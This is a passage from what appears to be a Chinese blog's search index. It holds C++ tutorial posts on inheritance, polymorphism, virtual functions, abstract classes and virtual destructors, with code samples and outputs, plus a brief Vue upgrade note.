父类指针和子类指针的步长可能是不一样的 a) 指针也只一种数据类型，对 C++ 类对象的指针执行 ++、-- 运算符仍然是合法的 b) "多态是用父类的指针指向子类的对象" 和 "父类指针步长的自加（++）" 是两个完全不同的概念 c) 当子类继承父类后，没有添加任何自己的成员变量和成员函数，那么此时父类指针和子类指针的步长才是一样的 d) 指针运算是按照指针所指的类型进行的，父类指针和子类指针的步长可能是不一样的，不要用父类指针自加（++）、自减（--）的方式来操作子类的对象数组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Parent{public: Parent(int a = 0) { this-&gt;a = a; } virtual void print() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};class Child : public Parent{public: Child(int b, int c) :Parent(0) { this-&gt;b = b; this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int b; int c;};int main(){ Parent* parent = NULL; Child* child = NULL; Child array[] = { Child(1, 2), Child(3,4), Child(5, 6) }; parent = array; child = array; // 指针自加运算后运行可能会出错，这里父类指针和子类指针的步长是不一样的，不要用父类指针自加（`++`）、自减（`--`）的方式来操作子类的对象数组 parent++; child++; parent++; child++; return 0;} 在父类的构造函数中调用虚函数，不能实现多态子类的 VPTR 指针是分步完成初始化的，当执行父类的构造函数时，子类 的 VPTR 指针指向父类的虚函数表，当父类的构造函数执行完毕后，才会把子类的 VPTR 指针指向子类的虚函数表。因此，在父类的构造函数中调用虚函数，不能实现多态。 a) 分析图解 如图 所示 b) 对象在创建的时，由编译器对 VPTR 指针进行初始化 c) 只有当对象的构造全部完成后，VPTR 指针的指向才能最终确定 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; // 在父类的构造函数中调用虚函数 print(); } virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(5, 8); return 0;} 程序运行的输出结果如下： 1I\'m parent, a = 5 纯虚函数和抽象类纯虚函数和抽象类的基本概念基本概念： a) 纯虚函数是一个在基类中说明的虚函数，且在基类中没有被定义，要求任何派生类都定义自己的版本 b) 纯虚函数为各派生类提供一个公共界面，可以实现接口的封装和设计、软件的模块功能划分 c) 纯虚函数的声明形式： virtual 类型 函数名 ( 参数表 ) = 0; d) 一个具有纯虚函数的基类称为抽象类 使用限制： a) 可以声明抽象类的指针和引用 b) 抽象类不能创建对象（实例化） c) 抽象类不能作为函数的参数类型和返回值类型 纯虚函数和抽象类的应用案例定义一个图形抽象类 Figure，并声明了负责计算图形面积的纯虚函数 getArea()，然后再定义 Circle、Triangle、Squre 派生类，并各自实现了纯虚函数 getArea() 来计算不同图形的面积。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;using namespace std;// 抽象类class Figure {public: // 声明纯虚函数，计算面积 virtual double getArea() = 0;};class Circle : public Figure {public: Circle(double r) { this-&gt;r = r; } // 计算圆的面积 virtual double getArea() { double area = 3.14 * r * r; cout &lt;&lt; "圆的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double r;};class Triangle : public Figure {public: Triangle(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // 计算三角形的面积 virtual double getArea() { double area = a * b / 2; cout &lt;&lt; "三角形的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};class Square : public Figure {public: Square(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // 计算四边形的面积 virtual double getArea() { double area = a * b; cout &lt;&lt; "四边形的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};void printArea(Figure* base) { base-&gt;getArea();}int main() { // Figure f; // 错误写法，抽象类不能实例化 Triangle Triangle(20, 30); Circle circle(6.8); Square square(50, 60); // 可以声明抽象类的指针 Figure* pBase = new Circle(5.3); pBase-&gt;getArea(); // 可以声明抽象类的引用 Figure&amp; base = square; base.getArea(); printArea(&amp;Triangle); return 0;} 程序运行的输出结果如下： 123圆的面积: 88.2026四边形的面积: 3000三角形的面积: 300 纯虚函数和抽象类在多继承中的应用案例C++ 中没有 Java 中的接口概念，但可以使用抽象类和纯虚函数模拟 Java 中的接口（代码如下）。值得一提的是，C++ 中的接口类只有函数原型定义，没有任何数据的定义，同时继承多个接口类不会带来二义性和复杂性等问题。C++ 面向抽象类编程（Java 面向接口编程）是项目开发中重要技能之一。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;using namespace std;// 定义接口类一class Interface1 {public: virtual int add(int a, int b) = 0; virtual void print() = 0;};// 定义接口类二class Interface2 {public: virtual int mult(int a, int b) = 0; virtual void print() = 0;};// 定义父类class Parent {public: Parent() { this-&gt;a = 8; } virtual ~Parent() { } virtual int getA() { return a; }private: int a;};// 定义子类，首先继承父类，然后继承多个接口类class Child : public Parent, public Interface1, public Interface2 {public: int add(int a, int b) { return a + b; } int mult(int a, int b) { return a * b; } void print() { cout &lt;&lt; "Child::print() 函数被执行" &lt;&lt; endl; }};int main() { Child child; child.print(); Parent* parent = &amp;child; cout &lt;&lt; "a = " &lt;&lt; parent-&gt;getA() &lt;&lt; endl; Interface1* interface1 = &amp;child; int result1 = interface1-&gt;add(2, 5); cout &lt;&lt; "2 + 5 = " &lt;&lt; result1 &lt;&lt; endl; Interface2* interface2 = &amp;child; int result2 = interface2-&gt;mult(3, 6); cout &lt;&lt; "3 * 6 = " &lt;&lt; result2 &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 123a = 82 + 5 = 73 * 6 = 18 纯虚函数和抽象类在多继承中的使用总结C++ 中没有 Java 中的接口概念： 绝大多数面向对象语言都不支持多继承 绝大多数面向对象语言都支持接口的概念 C++ 中没有 Java 中的接口概念，但可以使用抽象类和纯虚函数模拟 Java 中的接口 C++ 中的接口类只有函数原型定义，没有任何数据的定义（代码如下） ★点击显示示例代码★ 1234567class Interface { public: virtual void func1() = 0; virtual void func2(int i) = 0; virtual void func3(int i) = 0; }; 工程上多继承的使用说明： a) 多继承已经被实际开发经验所抛弃 b) 工程开发中真正意义上的多继承是几乎不被使用的 c) 多继承带来的代码复杂性远多于其带来的便利 d) 多继承对代码维护性上的影响是灾难性的 e) 在设计方法上，任何多继承都可以使用单继承代替 f) 在多继承中，使用虚继承不能完全解决二义性的问题 虚继承的使用与适用场景介绍 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇），如右图所示 对于 V 字形的多继承场景，虚继承是没办法解决二义性问题的，如右图所示 工程上继承多个接口类的使用说明： a) 继承多个接口类不会带来二义性和复杂性等问题 b) 多继承可以通过精心设计的单继承和接口类来代替 c) 接口类只是一个功能说明，而不是功能实现，子类需要根据功能说明定义功能实现 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之八",url:"/posts/4c2ae4c0.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 多继承多继承概念 a) 一个类有多个直接基类（父类）的继承关系称为多继承 b) 类 C 可以根据访问控制同时继承类 A 和类 B 的成员，并添加自己的成员 c) 多继承声明语法 1234class 派生类名 : 访问控制 基类名1 , 访问控制 基类名2 , … , 访问控制 基类名n{ 数据成员和成员函数声明}; 多继承的简单应用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: Base3(int a, int b, int c) : Base1(a), Base2(b) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3); base.printA(); base.printB(); base.printC(); return 0;} 程序运行的输出结果如下： 123a = 1b = 2c = 3 派生类的构造函数和成员访问在多继承的派生类中，其构造函数和成员访问的特性如下： 拥有多个基类的派生类的构造函数，可以用初始化列表调用基类构造函数来初始化数据成员。 执行顺序与单继承构造函数情况类似，多个直接基类构造函数执行顺序取决于定义派生类时指定的各个继承基类的顺序。 一个派生类对象拥有多个直接或间接基类的成员。不同名成员访问不会出现二义性，如果不同的基类有同名成员，那么派生类对象访问时应该加以识别。 虚继承虚继承的概念 总结： 如果一个派生类从多个基类继承，而这些基类又有一个共同的基类（公共基类），则在对该基类中声明的成员进行访问时，可能会产生二义性。 如果在多条继承路径上有一个公共的基类，那么在继承路径的某处汇合点，这个公共基类就会在派生类的对象中产生多个基类子对象 要使这个公共基类在派生类中只产生一个子对象，必须对这个基类声明为虚继承，使这个基类成为 虚基类。 虚继承声明需要使用关键字：virtual 虚继承的简单应用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;using namespace std;class Base {public: Base(int x) { this-&gt;x = x; cout &lt;&lt; "Base 类的构造函数被调用" &lt;&lt; endl; } void printX() { cout &lt;&lt; "x = " &lt;&lt; x &lt;&lt; endl; }private: int x;};// 声明虚继承class Base1 : virtual public Base {public: Base1(int a, int x) : Base(x) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};// 声明虚继承class Base2 : virtual public Base {public: Base2(int b, int x) : Base(x) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: // 由于父类和虚基类没有默认的无参构造函数，所以这里的派生类需要在初始化列表中，显式调用父类、虚基类的有参构造函数 Base3(int a, int b, int c, int x) : Base1(a, x), Base2(b, x), Base(x) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3, 4); // 虚基类Base的构造函数只会被调用一次 base.printA(); base.printB(); base.printC(); base.printX(); // 当不声明虚继承的时候，此写法会产生二义性，C++编译器会出现编译错误 return 0;} 程序运行的输出结果如下： 12345Base 类的构造函数被调用a = 1b = 2c = 3x = 4 值得一提的是，如果虚基类声明了非默认形式的（即带参数的）构造函数，并且没有声明默认形式的（无参）构造函数，此时在整个继承关系中，直接或者间接继承虚基类的所有派生类，都必须在构造函数的成员初始化列表中列出对虚基类的初始化。因为涉及到多重继承和虚继承，为避免派生类因调用多个父类的构造函数后多次构造更上层虚基类，所以需要派生类自己显示调用继承而来的虚基类的构造函数，而继承链上其它所有对虚基类的构造函数调用将被忽略。简单一句话概况：父类不会帮子类调用虚基类的构造函数，子类在构造时必须自己初始化所有虚基类。 虚继承的适用场景 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇），如右图所示 对于 V 字形的多继承场景（代码如下），虚继承是没办法解决二义性问题的，如右图所示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void print() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : virtual public Base1, virtual public Base2 {public: Base3(int a, int b) : Base1(a), Base2(b) { }};int main() { Base3 base(1, 2); // 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇） // 即使上面声明了虚继承，但此写法仍然会产生二义性，C++编译器会出现编译错误 // base.print(); base.Base1::print(); base.Base2::print(); return 0;} 程序运行的输出结果如下： 12a = 1b = 2 多态多态是面向对象的三大概念（如下）之一，按字面的意思就是多种形态。当类之间存在层次结构，并且类之间是通过继承关联时，就会使用到多态。C++ 的多态意味着调用成员函数时，会根据调用函数的对象的类型来执行不同的函数。值得一提的是，多态是设计模式的基础，同时也是框架的基石。 封装：突破了 C 语言函数的概念。 继承：提高了代码的可重用性。 多态：多态是指在不同继承关系的类对象中，去调同一函数，产生了不同的行为。多态的一般使用方式，是使用一个父类的指针或引用去调用子类中被重写的方法。 函数重写函数重写的概念 函数重写是指在子类中定义与父类中原型相同的函数 父类中被重写的函数依然会继承给子类 默认情况下，在子类中重写的函数将隐藏父类中的函数 通过作用域分辨符 :: 可以访问到父类中被隐藏的函数 函数重写只发生在父类与子类之间，而函数重载只发生在同一个类中 函数重写的应用12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } // 子类重写父类中的函数 void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(3, 7); // 执行子类的函数，默认情况下子类中重写的函数将隐藏父类中的函数 child.print(); // 执行父类的函数，通过作用域分辨符"::"可以访问到父类中被隐藏的函数 child.Parent::print(); return 0;} 程序运行的输出结果如下： 12I\'m child, c = 7I\'m parent, a = 3 函数重写与函数重载的区别 函数重载 必须在同一个类中进行 子类无法重载父类的函数，父类同名函数将被子类的覆盖 重载是在编译期间根据参数类型、个数和顺序决定函数的调用 函数重写 必须发生于父类与子类之间 父类与子类中的函数必须有完全相同的原型 使用 virtual 关键字声明之后，能够产生多态（如果不使用 virtual 关键字声明，那叫重定义） 虚函数类型兼容原则遇上函数重写当 类型兼容原则 遇上函数重写时，执行以下代码后会出现意外的现象，即被调用的永远是父类的函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // 子类重写父类中的函数 void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // 执行父类的函数 p = &amp;parent; p-&gt;print(); // 执行父类的函数 p = &amp;child; p-&gt;print(); return 0;} 程序运行的输出结果如下： 12I\'m parent, a = 6I\'m parent, a = 5 C/C++ 是静态编译型语言，在执行编译时，编译器会自动根据指针的类型判断指向的是一个什么样的对象。但在编译 print() 函数的时候，编译器不可能知道指针 p 究竟指向了什么对象，因为程序还没有运行。同时编译译器没有理由报错，于是编译器认为最安全的做法是编译到父类的 print() 函数，因为父类和子类肯定都有相同的 print() 函数。这就是所谓的 静态多态 或 静态联编，函数调用在程序执行之前就已经准备好了；有时候这也被称为 早绑定，因为 print() 函数在程序编译期间就已经设置好了。这就引出了面向对象新的需求，希望根据实际的对象类型来判断重写函数的调用；如果父类指针指向的是父类对象则调用父类中定义的函数，如果父类指针指向的是子类对象则调用子类中定义的重写函数，如图所示。 虚函数的应用C++ 中通过 virtual 关键字对多态进行支持，使用 virtual 关键字声明的函数被重写后即可展现多态特性，一般称之为 虚函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } // 使用 "virtual" 关键字声明父类的函数 virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // 使用 "virtual" 关键字声明重写父类中的函数 // 只要父类中的函数有 "virtual" 关键字的声明，那么子类的 "virtual" 声明可写可不写，一般建议都写上 virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // 执行父类的函数 p = &amp;parent; p-&gt;print(); // 执行子类的函数 p = &amp;child; p-&gt;print(); return 0;} 程序运行的输出结果如下： 12I\'m parent, a = 6I\'m child, c = 5 此时，编译器看的是指针的内容，而不是它的类型。因此，由于 Parent 和 Child 类的对象的地址存储在 *p 中，所以会调用各自的 print() 函数。正如所看到的，父类 Parent 的每个子类都有一个 print() 函数的独立实现。这就是多态的一般使用方式，即使用一个父类的指针或引用去调用子类中被重写的方法。有了多态就可以有多个不同的实现类，它们都带有同一个名称但具有不同实现的函数，函数的参数甚至可以是相同的。 虚析构函数虚析构函数的作用：为了避免内存泄漏，通过父类的指针，可以将所有子类对象的析构函数都执行一遍（释放所有的子类资源）。即虚析构函数使得在删除指向子类对象的父类指针时，可以调用子类的析构函数来实现释放子类中堆内存的目的，从而防止内存泄漏。 析构函数可以是虚的，虚析构函数用于指引 delete 运算符正确析构动态对象 构造函数不能是虚函数，因为建立一个派生类对象时，必须从类层次的根开始，沿着继承路径逐个调用基类的构造函数 虚析构函数的简单应用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;using namespace std;class A {public: A() { this-&gt;p = new char[20]; strcpy(p, "Hello A"); cout &lt;&lt; "A 类的构造函数被调用" &lt;&lt; endl; } virtual ~A() { delete[] this-&gt;p; cout &lt;&lt; "A 类的析构函数被调用" &lt;&lt; endl; }private: char* p;};class B : public A {public: B() { this-&gt;p = new char[20]; strcpy(p, "Hello B"); cout &lt;&lt; "B 类的构造函数被调用" &lt;&lt; endl; } ~B() { delete[] this-&gt;p; cout &lt;&lt; "B 类的析构函数被调用" &lt;&lt; endl; }private: char* p;};int main() { // 此写法，如果上面不使用 "virtual" 修饰A类（基类）的析构函数，派生类与所有基类的析构函数依然都会被自动调用一次 B* b = new B(); delete b; cout &lt;&lt; endl; // 此写法，如果上面不使用 "virtual" 修饰A类（基类）的析构函数，那么只有A类（基类）的析构函数会被调用一次，B类（派生类）的析构函数不会被调用，这样就会造成内存泄漏 // 虚析构函数的作用是，通过父类的指针，可以将所有子类对象的析构函数都执行一遍（释放所有的子类资源）。 A* a = new B(); delete a; return 0;} 程序运行的输出结果如下： 123456789A 类的构造函数被调用B 类的构造函数被调用B 类的析构函数被调用A 类的析构函数被调用A 类的构造函数被调用B 类的构造函数被调用B 类的析构函数被调用A 类的析构函数被调用 虚析构函数的作用总结 a) 如果基类的析构函数不加 virtual 关键字修饰，那么就是普通析构函数 当基类中的析构函数没有声明为虚析构函数时，派生类开始从基类继承，基类的指针指向派生类的对象时，delete 基类的指针时，只会调用基类的析构函数，不会调用派生类的析构函数 b) 如果基类的析构函数加 virtual 关键字修饰，那么就是虚析构函数 当基类中的析构函数声明为虚析构函数时，派生类开始从基类继承，基类的指针指向派生类的对象时，delete 基类的指针时，先调用派生类的析构函数，再调用基类中的析构函数 多态的理论基础 联编：是指一个程序模块、代码之间互相关联的过程 静态联编：是程序的匹配、连接在编译阶段实现，也称为早期联编（早绑定） 函数重载属于静态联编 动态联编：是指程序联编推迟到运行时进行，所以又称为晚期联编（迟绑定） 虚函数、switch 语句和 if 语句属于动态联编 多态理论联系实际应用（代码示例）： C++ 与 C 相同，是静态编译型语言 在编译时，编译器会自动根据指针的类型判断指向的是一个什么样的对象，所以编译器认为父类指针指向的是父类对象 由于程序没有运行，所以不可能知道父类指针指向的具体是父类对象还是子类对象 从程序安全的角度，编译器假设父类指针只指向父类对象，因此编译的结果为调用父类的成员函数，这种特性就是 静态联编 多态成立的三个必要条件 a) 要有继承 b) 要有虚函数重写 c) 父类指针或引用指向子类对象 C++ 11 的 override 和 finaloverride 关键字：用来检查函数是否重写，在子类中的函数声明里加上该关键字 virtual void fun() override {}，编译器就会自动检查对应的函数是否重写了父类中的函数final 关键字：在类的声明中加上该关键字 class A final {};，目的是为了不让这个类被继承。或者，在一个函数后加上该关键字，表示这个函数不能被重写 void fun() final {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Vue 开发随笔",url:"/posts/d786f74a.html",text:'Vue 版本升级若项目需要升级 Vue 的版本，一般主要是升级 vue 和 vue-template-compiler 组件，而且两者的版本号必须一致，升级步骤如下： a) 删除项目里的 node_modules 文件夹 和 package-lock.json 文件 b) 执行 npm view vue versions 命令查看 Vue 的所有版本号 c) 更改项目里的 package.json 文件，为 vue 和 vue-template-compiler 组件指定新的版本号 d) 在项目里执行 npm install 命令 e) 重新编译构建项目，观察项目代码是否可以正常编译 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端 开发随笔"},{title:"C++ 入门基础之七",url:"/posts/e4826e2c.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 继承概念面向对象程序设计有 4 个主要特点：抽象、封装、继承和多态性。面向对象程序设计的两个重要特征一数据抽象与封装，两者已经能够设计出基于对象的程序，这是面向对象程序设计的基础。要较好地进行面向对象程序设计，还必须了解面向对象程序设计另外两个重要特征 —— 继承性和多态性。继承性是面向对象程序设计最重要的特征，可以说，如果没有掌握继承性，就等于没有掌握类和对象的精华，就是没有掌握面向对象程序设计的真谛。 类之间的关系类之间一般有三种关系：has-A、uses-A 和 is-A： has-A：包含关系，用以描述一个类由多个 “部件类” 构成。实现 has-A 关系可以用类成员表示，即一个类中的数据成员是另一种已经定义的类。 uses-A：一个类部分地使用另一个类。类之间成员函数的联系，可以通过定义友元或者对象参数传递来实现。 is-A：机制称为 “继承” 。关系具有传递性，不具有对称性。 继承关系举例 继承相关概念 派生类的定义 值得一提的是，C++ 中的继承方式（public、private、protected）会影响子类的对外访问属性。 继承重要说明 a) 子类拥有父类的所有成员变量和成员函数 b) 子类可以拥有父类没有的方法和属性 c) 子类就是一种特殊的父类 d) 子类对象可以当作父类对象使用 继承使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;// 定义父类（基类）（父类）class Parent {public: Parent(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: int a; int b;};// 定义派生类（子类）class Child : public Parent {public: Child(int a = 0, int b = 0, int c = 0) { // 直接访问父类（基类）（父类）的成员变量 this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; } void echo() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; ", c=" &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child child(1, 2, 3); child.print(); // 直接调用父类（基类）（父类）的成员函数 child.echo(); // 直接调用派生类（子类）的成员函数 return 0;} 程序运行的输出结果如下： 12a=1, b=2a=1, b=2, c=3 派生类的访问控制派生类（子类）继承了基类（父类）的全部成员变量和成员函数（除了构造函数和析构函数之外的成员函数），但是这些成员的访问属性，在派生过程中是可以调整的。 单个类的访问控制在 C++ 中，类成员变量和类成员函数的访问级别为 public、private、protected private：修饰的成员变量和成员函数，只能在类的内部被访问 public：修饰的成员变量和成员函数，可以在类的内部和类的外部被访问 protected：修饰的成员变量和成员函数，可以在派生类的内部访问，不能在派生类的外部被访问 特别注意：若在类中没有声明访问控制级别的成员变量和成员函数，默认都是 private 访问级别的 继承成员的访问控制在 C++ 中，不同的继承方式（public、private、protected）会改变继承成员的访问属性： public 继承：父类成员在子类中保持原有的访问级别 private 继承：父类成员在子类中都变为 private 成员 protected 继承：父类中 public 成员会变成 protected，父类中 private 成员仍然为 private，父类中 protected 成员仍然为 protected 特别注意：private 成员在子类中依然存在，但是无法访问到的，即不论使用哪种方式继承父类，子类都不能直接使用父类的私有成员 继承成员访问控制的 “三看” 原则在 C++ 中，不同的继承方式（public、private、protected）会改变继承成员的访问属性，最终可总结为以下三个原则（判断某一句话，是否可以被访问）： a) 看调用语句是写在子类的内部还是外部 b) 看子类如何从父类继承（public、private、protected） c) 看父类中的访问级别（public、private、protected） 派生类成员访问级别控制的原则对于派生类自身的成员，访问级别控制的原则如下： a) 需要被外界访问的成员直接设置为 public b) 只能在当前类中访问的成员设置为 private c) 只能在当前类和子类中访问的成员设置为 protected 继承中的构造和析构类型兼容原则类型兼容规则是指在需要基类对象的任何地方，都可以使用公有派生类（公有继承）的对象来替代。通过公有继承，派生类得到了基类中除构造函数、析构函数之外的所有成员。这样，公有派生类实际就具备了基类的所有功能，凡是基类能解决的问题，公有派生类都可以解决。值得一提的是，在替代之后，派生类对象就可以作为基类的对象使用，但是只能使用从基类继承得到的成员，类型兼容规则是多态性的重要基础之一。类型兼容规则中所指的替代包括以下情况： 子类对象可以当作父类对象使用 子类对象可以直接赋值给父类对象 子类对象可以直接初始化父类对象 父类指针可以直接指向子类对象 父类引用可以直接引用子类对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;using namespace std;// 父类class Parent {public: void printParent() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};// 子类（公有继承）class Child : public Parent {public: void printChild() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int c;};void howToPrint(Parent* p) { p-&gt;printParent();}void howToPrint(Parent&amp; p) { p.printParent();}int main() { Parent p1; p1.printParent(); Child c1; c1.printChild(); c1.printParent(); // 1-1 父类指针可以直接指向子类对象 cout &lt;&lt; "1-1" &lt;&lt; endl; Parent* p2 = NULL; p2 = &amp;c1; p2-&gt;printParent(); // 1-2 父类指针可以直接指向子类对象，指针做函数参数 cout &lt;&lt; "1-2" &lt;&lt; endl; howToPrint(&amp;p1); howToPrint(&amp;c1); // 2-1 父类引用可以直接引用子类对象 cout &lt;&lt; "2-1" &lt;&lt; endl; Parent&amp; p3 = c1; p3.printParent(); // 2-2 父类引用可以直接引用子类对象，引用做函数参数 cout &lt;&lt; "2-2" &lt;&lt; endl; howToPrint(p1); howToPrint(c1); // 3-1 子类对象可以直接初始化父类对象，会自动调用父类的拷贝构造函数 cout &lt;&lt; "3-1" &lt;&lt; endl; Parent p4 = c1; p4.printParent(); // 4-1 子类对象可以直接赋值给父类对象 cout &lt;&lt; "4-1" &lt;&lt; endl; Parent p5; p5 = c1; p5.printParent(); return 0;} 程序运行输出的结果如下： 1234567891011121314151617I\'m parentI\'m childI\'m parent1-1I\'m parent1-2I\'m parentI\'m parent2-1I\'m parent2-2I\'m parentI\'m parent3-1I\'m parent4-1I\'m parent 继承中的对象模型类在 C++ 编译器的内部可以理解为结构体，子类是由父类成员叠加子类新成员得到的。 父类与子类的构造函数、析构函数的关系如下： 在子类对象构造时，需要调用父类构造函数对其继承得来的成员进行初始化 在子类对象析构时，需要调用父类析构函数对其继承得来的成员进行清理 继承中的构造与析构的调用原则 a) 子类对象在创建时，会首先调用父类的构造函数 b) 父类构造函数执行结束后，再执行子类的构造函数 c) 当父类只存在有参构造函数时，必须在子类的初始化列表中显示调用父类的构造函数 d) 析构函数调用的先后顺序与构造函数相反，即先调用子类的析构函数，再调用父类的析构函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "父类的构造函数被调用" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "父类的析构函数被调用" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, a = " 